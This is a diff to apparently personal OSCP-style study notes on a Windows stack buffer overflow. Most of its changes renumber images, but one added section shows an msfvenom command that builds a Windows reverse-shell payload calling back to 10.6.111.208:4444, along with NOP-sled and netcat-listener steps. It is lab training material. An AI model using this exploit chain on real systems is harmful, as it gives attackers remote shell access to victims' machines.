@@ -127,7 +127,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
   * \[<mark style="color:yellow;">35714234</mark>]
 * Note this is the EIP
 
-<figure><img src="../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Find the Distance from EIP
 
@@ -148,7 +148,7 @@ msf-pattern_offset -l 1600 -q 35714234
 * Run the exploit
 * You should get 42424242 in the EIP address
 
-<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 * Now we have the EIP register overwritten
 * <mark style="color:yellow;">ESP address = 018CFA30</mark>
@@ -171,12 +171,12 @@ print()
 * Run the exploit
 * Take note of the ESP register address <mark style="color:yellow;">0198FA30</mark>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 * Right-click on the ESP register and click follow in dump
 * We will now be able to identify bad chars from the hex dump
 
-<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 Let's use mona now to find some bad chars!
 
@@ -186,7 +186,7 @@ Let's use mona now to find some bad chars!
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 <pre><code><strong>01</strong></code></pre>
 
@@ -218,7 +218,7 @@ Let's use mona now to find some bad chars!
 
 * We have a ton more bad chars now due to adjacent addressing
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Attempt 2
 
@@ -242,7 +242,7 @@ Let's use mona now to find some bad chars!
 !mona compare -f C:\mona\oscp\bytearray.bin -a 019CFA30
 ```
 
-<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 * 40 is the next badchar up so we will use it next
 
@@ -268,7 +268,7 @@ Let's use mona now to find some bad chars!
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 * 5f is next and we need to remove it!
 
@@ -342,7 +342,7 @@ Let's use mona now to find some bad chars!
 !mona compare -f C:\mona\oscp\bytearray.bin -a 018DFA30
 ```
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 * We see the status of "<mark style="color:yellow;">Unmodified</mark>" this is exactly what we were chasing after!!!!!
 
@@ -360,7 +360,7 @@ Use Mona:
 !mona jmp -r esp -cpb "\x00\x01\x11\x40\x5f\xb8\xee"
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 * Let's use <mark style="color:yellow;">62501203</mark>
 * Remember to use Little Endian reverse order!
@@ -384,3 +384,29 @@ Note the address: <mark style="color:yellow;">62501203</mark>
 6\. Run the Exploit
 
 7\. You will notice that a breakpoint occurred!
+
+### Msfvenom
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x11\x40\x5f\xb8\xee" -f c
+```
+
+1. Copy the shell code only
+2. Open the exploit and add the shellcode to the payload section
+
+## NOP Sledding
+
+1. Add a padding of  <mark style="color:yellow;">"\x90" \* 16</mark>
+2. Save the file
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+## Exploitation
+
+1. Start a netcat listener on the port specified in the payload
+2. Restart the program
+3. Start the program
+4. Go back to your exploit and run it
+5. You should have a shell
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
